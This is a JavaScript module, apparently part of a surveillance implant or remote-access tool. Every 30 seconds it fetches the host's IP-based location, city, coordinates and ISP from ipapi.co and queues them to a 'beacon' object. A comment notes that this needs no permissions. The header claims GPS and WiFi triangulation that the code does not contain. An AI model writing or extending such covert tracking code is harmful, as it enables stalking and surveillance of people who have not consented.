/**
 * Geo-Location Module
 * GPS (mobile), WiFi triangulation, IP geolocation fallback.
 */

const https = require("https");
const config = require("../config");
const logger = require("../logger");

class LocationModule {
  constructor(beacon) {
    this.beacon = beacon;
    this.timer = null;
    this.lastLocation = null;
  }

  start() {
    this._collect();
    this.timer = setInterval(() => this._collect(), 30000);
    logger.debug("LocationModule started");
  }

  stop() {
    clearInterval(this.timer);
  }

  async _collect() {
    try {
      const location = await this._getLocation();
      if (location && JSON.stringify(location) !== JSON.stringify(this.lastLocation)) {
        this.lastLocation = location;
        this.beacon.queue_data("location", location);
      }
    } catch (err) {
      logger.error("LocationModule error:", err.message);
    }
  }

  async _getLocation() {
    // Try IP geolocation as primary (works on all platforms without permissions)
    return new Promise((resolve) => {
      const req = https.get("https://ipapi.co/json/", { timeout: 5000 }, (res) => {
        let data = "";
        res.on("data", chunk => { data += chunk; });
        res.on("end", () => {
          try {
            const geo = JSON.parse(data);
            resolve({
              method: "ip_geolocation",
              ip: geo.ip,
              city: geo.city,
              region: geo.region,
              country: geo.country_name,
              lat: geo.latitude,
              lng: geo.longitude,
              isp: geo.org,
              timezone: geo.timezone,
              ts: Date.now(),
            });
          } catch {
            resolve(this._fallbackLocation());
          }
        });
      });
      req.on("error", () => resolve(this._fallbackLocation()));
      req.on("timeout", () => { req.destroy(); resolve(this._fallbackLocation()); });
    });
  }

  _fallbackLocation() {
    return {
      method: "unknown",
      lat: null,
      lng: null,
      ts: Date.now(),
    };
  }
}

module.exports = LocationModule;
